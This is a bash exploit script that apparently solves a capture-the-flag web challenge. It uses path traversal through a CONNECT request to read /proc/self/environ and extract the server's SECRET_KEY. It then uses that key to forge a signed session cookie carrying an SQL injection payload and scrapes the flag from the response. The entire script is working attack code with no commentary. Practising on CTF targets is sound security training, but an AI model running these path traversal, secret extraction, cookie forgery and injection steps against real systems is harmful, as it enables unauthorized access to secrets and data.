#!/bin/bash
if [ ! -e ./forge-cookie/app ]; then
  cd forge-cookie
  go build -ldflags "-s -w" -o app app.go
  if [ $? != 0 ]; then
    echo "build forge-cookie app failed"
    exit -1
  fi
  cd ..
fi

URL='http://dvd.chal.h4ck3r.quest:10001'
SECRET_KEY=$(curl -s --path-as-is -X CONNECT "$URL/static/../../proc/self/environ" --output - | tr '\0' '\n' | grep 'SECRET_KEY' | cut -d '=' -f 2 | tr -d '\n')

payload="' or flag like 'FLAG{%}"
session=$(echo $payload | SECRET_KEY=$SECRET_KEY ./forge-cookie/app)

curl -s -H "Cookie: session=$session" $URL | grep 'FLAG' | awk '{ print $1 }'
